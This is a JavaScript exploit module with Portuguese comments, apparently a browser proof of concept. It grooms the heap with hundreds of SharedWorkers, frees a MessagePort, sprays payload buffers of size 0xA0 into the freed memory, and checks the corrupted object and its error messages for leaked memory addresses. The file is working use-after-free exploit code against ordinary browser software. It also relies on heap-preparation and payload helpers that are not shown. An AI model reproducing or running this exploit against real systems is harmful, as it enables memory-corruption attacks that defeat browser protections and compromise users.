// Importações corrigidas para .js
import { CONFIG } from './config.js';
import { log } from './utils.js';
import { prepare_checkerboard_heap, clear_heap } from './heap.js';
import { build_leak_payload } from './payloads.js';

var workers_stash = [];
var is_running = false;
var interval_ref = null;

// Inicialização ligada ao botão
export function init() {
    const btn = document.getElementById("btn_run");
    if(btn) {
        btn.addEventListener("click", start_exploit);
        log("Módulos carregados. Pronto (Modo .js).", "success");
    } else {
        console.error("Botão não encontrado");
    }
}

async function start_exploit() {
    if (is_running) return;
    if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
    
    is_running = true;
    // Pegamos o tamanho do config (0xA0)
    const size = CONFIG.SIZES_TO_TEST[0];
    
    log(`>>> INICIANDO LEAK HUNTER (0x${size.toString(16)}) <<<`, "warn");

    // 1. Preparar Memória
    prepare_checkerboard_heap(size);
    
    // 2. Payload
    const payload = build_leak_payload(size);

    // 3. Grooming (Base)
    workers_stash = [];
    for(let i=0; i<380; i++) {
        try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
    }

    // 4. Trigger Loop
    let p_count = 0;
    const limit = CONFIG.WORKER_LIMIT - 380;

    interval_ref = setInterval(() => {
        if (p_count >= limit) {
            clearInterval(interval_ref);
            
            // O ÚLTIMO (403)
            const victim = workers_stash.pop();
            
            attempt_leak(victim, payload);
            
            is_running = false;
            return;
        }

        try {
            let w = new SharedWorker("data:text,1", "v_"+p_count);
            w.port.start();
            workers_stash.push(w);
            
            if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
        } catch(e) {}
        
        p_count++;
    }, 60);
}

function attempt_leak(victim, payload) {
    log("!!! DISPARANDO SWAP (0xA0) !!!", "warn");
    
    const port = victim.port;
    
    // 1. FREE
    victim.port.close();
    
    // 2. SPRAY (Imediato)
    const spray = [];
    for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
        spray.push(payload.slice(0));
    }

    // 3. VERIFICAÇÃO
    setTimeout(() => {
        try {
            const s = port.toString();
            
            if (s.indexOf("MessagePort") === -1) {
                log("!!! SUCESSO ABSOLUTO !!!", "leak");
                log("Objeto Corrompido: " + s, "leak");
                alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
            } else {
                log("Falha: Objeto intacto [object MessagePort].");
                
                // Teste de estresse
                try { let temp = port.onmessage; } catch(e) {
                    if(e.toString().match(/0x/)) {
                        log("LEAK NO ERRO: " + e, "leak");
                        alert("LEAK NO ERRO!");
                    }
                }
            }
        } catch (e) {
            log("ERRO CAPTURADO: " + e, "leak");
        }
        
        cleanup();
    }, 500);
}

function cleanup() {
    workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
    clear_heap();
}
